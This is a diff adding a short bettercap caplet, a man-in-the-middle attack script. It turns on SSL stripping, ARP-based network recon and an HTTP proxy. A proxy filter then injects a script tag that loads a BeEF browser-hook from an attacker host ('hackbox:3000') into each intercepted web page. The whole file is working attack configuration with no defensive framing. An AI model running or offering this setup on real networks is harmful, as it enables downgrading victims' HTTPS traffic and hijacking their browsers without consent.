@@ -1,0 +1,19 @@
+# strip down https links when possible
+set http.proxy.sslstrip true
+# inject beef hook
+set http.proxy.post.filter |</head>|<script type="text/javascript" src="http://hackbox:3000/hook.js"></script></head>|
+#
+# keep reading arp table for network mapping
+net.recon on
+# redirect http traffic to a proxy
+http.proxy on
+
+# wait for everything to start properly
+sleep 1
+active
+
+
+
+
+
+
